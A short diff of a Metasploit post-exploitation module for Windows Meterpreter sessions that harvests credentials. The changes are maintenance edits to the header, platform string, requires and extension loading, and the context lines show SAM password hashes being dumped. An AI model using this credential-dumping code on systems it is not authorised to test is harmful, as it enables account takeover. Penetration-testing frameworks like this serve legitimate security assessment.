@@ -1,17 +1,14 @@
 ##
-# $Id$
-##
-
-##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/common'
+require 'msf/core/auxiliary/report'
 
 
 class Metasploit3 < Msf::Post
@@ -25,8 +22,7 @@ class Metasploit3 < Msf::Post
 				'Description'   => %q{ This module harvests credentials found on the host and stores them in the database.},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'tebo[at]attackresearch.com'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
+				'Platform'      => [ 'win' ],
 				'SessionTypes'  => [ 'meterpreter']
 			))
 
@@ -43,8 +39,8 @@ class Metasploit3 < Msf::Post
 		end
 
 		# Make sure we're rockin Priv and Incognito
-		session.core.use("priv") if not session.respond_to?("priv")
-		session.core.use("incognito") if not session.respond_to?("incognito")
+		session.core.use("priv") if not session.priv
+		session.core.use("incognito") if not session.incognito
 
 		# It wasn't me mom! Stinko did it!
 		hashes = client.priv.sam_hashes
